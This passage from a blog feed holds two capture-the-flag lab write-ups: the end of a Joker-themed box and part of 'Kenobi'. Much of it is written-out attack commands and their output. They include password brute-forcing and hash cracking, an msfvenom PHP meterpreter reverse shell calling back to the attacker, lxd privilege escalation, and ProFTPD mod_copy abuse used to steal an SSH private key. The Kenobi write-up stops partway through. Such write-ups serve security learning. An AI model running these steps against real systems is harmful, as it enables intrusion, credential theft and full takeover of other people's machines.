root@kali:~# &lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-17.40.16.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;And we have a secret conversation between Batman and the Joker, checking other directories and backend php file info doesn't give us anything for now ...&lt;/p&gt;&lt;p&gt;our next shot, some brute-forcing in port 8080 and using Batman or Joker as a username and see what we get.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-19.30.39.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Xhydra is the GUI version of hydra, both of them work fine. But I choose the GUI version because it was faster and less troubleshooting for my machine.&lt;/p&gt;&lt;p&gt;the password used by Joker is h****h, with dirbuster or dirb or gobuster we can't look for directories so we will use nikto with the credentials, and see if we can do anything with them &lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nikto -h http://10.10.215.43:8080/ -id joker:h****h
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.215.43
+ Target Hostname:    10.10.215.43
+ Target Port:        8080
+ Start Time:         2020-04-07 18:31:07 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ / - Requires Authentication for realm ' Please enter the password.'
+ Successfully authenticated to realm ' Please enter the password.' with user-supplied credentials.
+ Entry '/administrator/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/bin/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/cache/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/cli/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/components/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/includes/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/language/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/layouts/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/libraries/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/modules/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/plugins/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/tmp/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 14 entries which should be manually viewed.
+ /backup.zip: Potentially interesting archive/cert file found.
+ /backup.zip: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ Uncommon header 'tcn' found, with contents: choice
+ OSVDB-3092: /web.config: ASP config file is accessible.
+ OSVDB-8193: /index.php?module=ew_filemanager&amp;amp;type=admin&amp;amp;func=manager&amp;amp;pathext=../../../etc: EW FileManager for PostNuke allows arbitrary file retrieval.
+ OSVDB-3092: /administrator/: This might be interesting...
+ OSVDB-3092: /bin/: This might be interesting...
+ OSVDB-3092: /includes/: This might be interesting...
+ OSVDB-3092: /tmp/: This might be interesting...
+ OSVDB-3092: /README: README file found.
+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /htaccess.txt: Default Joomla! htaccess.txt file found. This should be removed or renamed.
+ /administrator/index.php: Admin login page/section found.
+ 8719 requests: 0 error(s) and 34 item(s) reported on remote host
+ End Time:           2020-04-07 18:31:43 (GMT0) (36 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;we gathered a lot of useful information, the first thing that got my attention was the &lt;strong&gt;backup.zip&lt;/strong&gt; file and the &lt;strong&gt;/administrator&lt;/strong&gt; directory.&lt;/p&gt;&lt;p&gt;After downloading the backup.zip file it was encrypted, but not for so long ...&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/26xBN6I5tVKveX2wg" width="480" height="256" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/johnwick2-lionsgate-john-wick-26xBN6I5tVKveX2wg"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~/Downloads# zip2john backup.zip &amp;gt; hash
root@kali:~/Downloads# john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
h****h           (backup.zip)
1g 0:00:00:00 DONE (2020-04-07 18:34) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thank you Joker for using the same passwords , after decompressing the backup we found a database and a backup of the whole site. &lt;/p&gt;&lt;p&gt;the database contained the credentials to access the running site and that's what we did, our next step will be getting a reverse shell, obviously, after we decrypt the admin password ... obviously &lt;/p&gt;&lt;pre&gt;&lt;code&gt;INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15',&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-19.45.31.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;" target="_blankroot@kali:~# john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
a******4         (?)
1g 0:00:00:14 DONE (2020-04-07 18:48) 0.06997g/s 71.79p/s 71.79c/s 71.79C/s bullshit..bulldogs
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-19.50.16.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-19.50.50.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;go to extension, and upload your reverse shell. I created mine with msfvenom the payload &lt;strong&gt;php/meterpreter/reverse_tcp&lt;/strong&gt; exported it as raw php and uploaded it in the error.php file and previewed it from the site and it called back to us.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# msfconsole
[-] ***rting the Metasploit Framework console.../
[-] * WARNING: No database support: No database YAML file
[-] ***
                                                  
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v5.0.71-dev                          ]
+ -- --=[ 1962 exploits - 1095 auxiliary - 336 post       ]
+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 &amp;gt; use exploit/multi/handler
msf5 exploit(multi/handler) &amp;gt; set payload php/meterpreter/reverse_tcp
payload =&amp;gt; php/meterpreter/reverse_tcp                                              
msf5 exploit(multi/handler) &amp;gt; set lhost 10.10.188.92                                
lhost =&amp;gt; 10.10.188.92                                                               
msf5 exploit(multi/handler) &amp;gt; set lport 7878                                        
lport =&amp;gt; 7878                                                                       
msf5 exploit(multi/handler) &amp;gt; run                                                   
                                                                                    
[*] Started reverse TCP handler on 10.10.188.92:7878                                
[*] Sending stage (38288 bytes) to 10.10.215.43                                     
[*] Meterpreter session 1 opened (10.10.188.92:7878 -&amp;gt; 10.10.215.43:34370) at 2020-04-07 19:00:43 +0000                                                                 
                                                                                    
meterpreter &amp;gt; getuid
Server username: www-data (33)                                                      
meterpreter &amp;gt;                          &lt;/code&gt;&lt;/pre&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/UoYA5jnXE5V7u4MJh7" width="480" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/joker-the-dark-knight-washing-hands-UoYA5jnXE5V7u4MJh7"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-20.06.11.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;if we look closer we are part of a group called lxd, for me, I just learned what is lxd (linux containers) and how do they work ... I would suggest reading the article that I'll leave at the end, so you can learn more about lxd and the privilege escalation that can be done.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-20.07.56.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code class="language-markup"&gt;$ lxc init myalpine joker -c security.privileged=true
Creating Joker
$ lxc config device add joker mydevice disk source=/ path=/mnt/root recursive=true
$ lxc start joker
$ lxc exec ignite /bin/sh
whoami
root&lt;/code&gt;&lt;/pre&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/13Iz0UAOQlWYU" width="480" height="280" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/batman-13Iz0UAOQlWYU"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;That's it for today, stay safe, and HAPPY HACKING!&lt;/p&gt;&lt;figure class="kg-card kg-embed-card"&gt;&lt;blockquote class="wp-embedded-content"&gt;&lt;a href="https://www.hackingarticles.in/lxd-privilege-escalation/"&gt;Lxd Privilege Escalation&lt;/a&gt;&lt;/blockquote&gt;
&lt;script type="text/javascript"&gt;
&lt;!--//--&gt;&lt;![CDATA[//&gt;&lt;!--
		/*! This file is auto-generated */
		!function(d,l){"use strict";var e=!1,o=!1;if(l.querySelector)if(d.addEventListener)e=!0;if(d.wp=d.wp||{},!d.wp.receiveEmbedMessage)if(d.wp.receiveEmbedMessage=function(e){var t=e.data;if(t)if(t.secret||t.message||t.value)if(!/[^a-zA-Z0-9]/.test(t.secret)){var r,a,i,s,n,o=l.querySelectorAll('iframe[data-secret="'+t.secret+'"]'),c=l.querySelectorAll('blockquote[data-secret="'+t.secret+'"]');for(r=0;r&lt;c.length;r++)c[r].style.display="none";for(r=0;r&lt;o.length;r++)if(a=o[r],e.source===a.contentWindow){if(a.removeAttribute("style"),"height"===t.message){if(1e3&lt;(i=parseInt(t.value,10)))i=1e3;else if(~~i&lt;200)i=200;a.height=i}if("link"===t.message)if(s=l.createElement("a"),n=l.createElement("a"),s.href=a.getAttribute("src"),n.href=t.value,n.host===s.host)if(l.activeElement===a)d.top.location.href=t.value}}},e)d.addEventListener("message",d.wp.receiveEmbedMessage,!1),l.addEventListener("DOMContentLoaded",t,!1),d.addEventListener("load",t,!1);function t(){if(!o){o=!0;var e,t,r,a,i=-1!==navigator.appVersion.indexOf("MSIE 10"),s=!!navigator.userAgent.match(/Trident.*rv:11\./),n=l.querySelectorAll("iframe.wp-embedded-content");for(t=0;t&lt;n.length;t++){if(!(r=n[t]).getAttribute("data-secret"))a=Math.random().toString(36).substr(2,10),r.src+="#?secret="+a,r.setAttribute("data-secret",a);if(i||s)(e=r.cloneNode(!0)).removeAttribute("security"),r.parentNode.replaceChild(e,r)}}}}(window,document);
//--&gt;&lt;!]]&gt;
&lt;/script&gt;&lt;iframe sandbox="allow-scripts" security="restricted" src="https://www.hackingarticles.in/lxd-privilege-escalation/embed/" width="600" height="338" title="&amp;#8220;Lxd Privilege Escalation&amp;#8221; &amp;#8212; Hacking Articles" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"&gt;&lt;/iframe&gt;&lt;/figure&gt;</content:encoded></item><item><title>Kenobi | CTF write-up</title><description>&lt;p&gt;today's CTF we will cover a Kenobi made by www.tryhackme.com the theme of the machine is star-wars ...&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/9gISqB3tncMmY" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/cat-star-wars-9gISqB3tncMmY"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Let's enumerate this machine and see what we're dealing with&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.68.87
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:36 UTC&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/kenobi-ctf-write-up/</link><guid isPermaLink="false">5e8c661f75832c27370ae6ca</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Tue, 07 Apr 2020 11:40:35 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/Animated-GIF-downsized_large.gif" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/Animated-GIF-downsized_large.gif" alt="Kenobi | CTF write-up"&gt;&lt;p&gt;today's CTF we will cover a Kenobi made by www.tryhackme.com the theme of the machine is star-wars ...&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/9gISqB3tncMmY" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/cat-star-wars-9gISqB3tncMmY"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Let's enumerate this machine and see what we're dealing with&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.68.87
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:36 UTC
Nmap scan report for ip-10-10-68-87.eu-west-1.compute.internal (10.10.68.87)
Host is up (0.00093s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      39562/udp6  mountd
|   100005  1,2,3      44287/udp   mountd
|   100005  1,2,3      57415/tcp6  mountd
|   100005  1,2,3      58933/tcp   mountd
|   100021  1,3,4      42750/udp6  nlockmgr
|   100021  1,3,4      45283/tcp6  nlockmgr
|   100021  1,3,4      45523/tcp   nlockmgr
|   100021  1,3,4      55170/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)          
2049/tcp open  nfs_acl     2-3 (RPC #100227)
MAC Address: 02:8A:BF:E2:69:EE (Unknown)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel        
Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2020-04-07T06:36:48-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-07T11:36:48
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.60 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-12.41.57.png" class="kg-image" alt="Kenobi | CTF write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-12.54.46.png" class="kg-image" alt="Kenobi | CTF write-up"&gt;&lt;/figure&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/8McNH1aXZnVyE" width="480" height="258" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/its-a-trap-admiral-ackbar-8McNH1aXZnVyE"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# gobuster dir -u http://10.10.68.87/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.68.87/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/07 11:43:04 Starting gobuster
===============================================================
/server-status (Status: 403)
===============================================================
2020/04/07 11:43:22 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;after trying to fuzz for some directories, we didn't find anything so we will keep enumerating until we find something, I will enumerate SMB in case there's anything shared publicly &lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.68.87
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:45 UTC
Nmap scan report for ip-10-10-68-87.eu-west-1.compute.internal (10.10.68.87)
Host is up (0.00017s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:8A:BF:E2:69:EE (Unknown)

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.68.87\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: &amp;lt;unlimited&amp;gt;
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.68.87\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: &amp;lt;unlimited&amp;gt;
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.68.87\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: &amp;lt;unlimited&amp;gt;
|     Path: C:\var\lib\samba\printers
|     Anonymous access: &amp;lt;none&amp;gt;
|_    Current user access: &amp;lt;none&amp;gt;
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 1.09 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# smbclient //10.10.68.87/anonymous
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \&amp;gt; dir
  .                                   D        0  Wed Sep  4 10:49:09 2019
  ..                                  D        0  Wed Sep  4 10:56:07 2019
  log.txt                             N    12237  Wed Sep  4 10:49:09 2019
                9204224 blocks of size 1024. 6855348 blocks available
smb: \&amp;gt; &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Port 111 running the service &lt;strong&gt;rpcbind&lt;/strong&gt;. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number it is prepared to serve.&lt;/p&gt;&lt;p&gt;In our case, port 111 is access to a network file system. Let's use nmap to enumerate this.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.68.87
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:54 UTC
Nmap scan report for ip-10-10-68-87.eu-west-1.compute.internal (10.10.68.87)
Host is up (0.00025s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1858288.0  6855340.0  22%   16.0T        32000
MAC Address: 02:8A:BF:E2:69:EE (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Use netcat to connect to the machine on the FTP port. We can use searchsploit to find exploits for a particular software version, &lt;strong&gt;Searchsploit&lt;/strong&gt; is basically just a command line search tool for exploit-db.com.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nc 10.10.68.87 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.68.87]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You ought to have discovered an exploit from ProFtpd's mod_copy module. The mod_copy module actualizes SITE CPFR and SITE CPTO commands, which can be utilized to copy files/directories from one place to another on the server. Any unauthenticated client can use these commands to duplicate documents from any piece of the filesystem to a chosen directory. We realize that the FTP administration is running as the Kenobi user (from the document on the share) and a ssh key is generated for that user.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# mkdir /mnt/kenobiNFS
root@kali:~# mount 10.10.68.87:/var /mnt/kenobiNFS
root@kali:~# cd /mnt/kenobiNFS/
root@kali:/mnt/kenobiNFS# ls -la
total 56
drwxr-xr-x 14 root root    4096 Sep  4  2019 .
drwxr-xr-x  3 root root    4096 Apr  7 12:00 ..
drwxr-xr-x  2 root root    4096 Sep  4  2019 backups
drwxr-xr-x  9 root root    4096 Sep  4  2019 cache
drwxrwxrwt  2 root root    4096 Sep  4  2019 crash
drwxr-xr-x 40 root root    4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff   4096 Apr 12  2016 local
lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -&amp;gt; /run/lock
drwxrwxr-x 10 root crontab 4096 Sep  4  2019 log
drwxrwsr-x  2 root mail    4096 Feb 26  2019 mail
drwxr-xr-x  2 root root    4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root       4 Sep  4  2019 run -&amp;gt; /run
drwxr-xr-x  2 root root    4096 Jan 29  2019 snap
drwxr-xr-x  5 root root    4096 Sep  4  2019 spool
drwxrwxrwt  6 root root    4096 Apr  7 11:59 tmp
drwxr-xr-x  3 root root    4096 Sep  4  2019 www
root@kali:/mnt/kenobiNFS#&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# cp /mnt/kenobiNFS/tmp/id_rsa .
root@kali:~# chmod 600 id_rsa 
root@kali:~# ssh -i id_rsa kenobi@10.10.68.87
The authenticity of host '10.10.68.87 (10.10.68.87)' can't be established.
ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.68.87' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo &amp;lt;command&amp;gt;".
See "man sudo_root" for details.

kenobi@kenobi:~$ &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and here we are ssh-ing to the kenobi user &lt;/p&gt;&lt;pre&gt;&lt;code&gt;kenobi@kenobi:~$ ls -la
total 40
drwxr-xr-x 5 kenobi kenobi 4096 Sep  4  2019 .
drwxr-xr-x 3 root   root   4096 Sep  4  2019 ..
lrwxrwxrwx 1 root   root      9 Sep  4  2019 .bash_history -&amp;gt; /dev/null
-rw-r--r-- 1 kenobi kenobi  220 Sep  4  2019 .bash_logout
-rw-r--r-- 1 kenobi kenobi 3771 Sep  4  2019 .bashrc
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .cache
-rw-r--r-- 1 kenobi kenobi  655 Sep  4  2019 .profile
drwxr-xr-x 2 kenobi kenobi 4096 Sep  4  2019 share
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .ssh
-rw-rw-r-- 1 kenobi kenobi   33 Sep  4  2019 user.txt
-rw------- 1 kenobi kenobi  642 Sep  4  2019 .viminfo
kenobi@kenobi:~$ cat user.txt 
xxxxxxxxxxxxxxxxxxxxxxxxxx224899
kenobi@kenobi:~$ &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Time for some privilege escalation &lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/l4Ho9Eed9XDNQ94k0" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/animation-design-illustration-l4Ho9Eed9XDNQ94k0"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;kenobi@kenobi:~$ find / -type f -perm -u=s 2&amp;gt;/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
kenobi@kenobi:~$&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code class="language-markup"&gt;kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
eth0      Link encap:Ethernet  HWaddr 02:8a:bf:e2:69:ee  
          inet addr:10.10.68.87  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::8a:bfff:fee2:69ee/64 Scope:Link
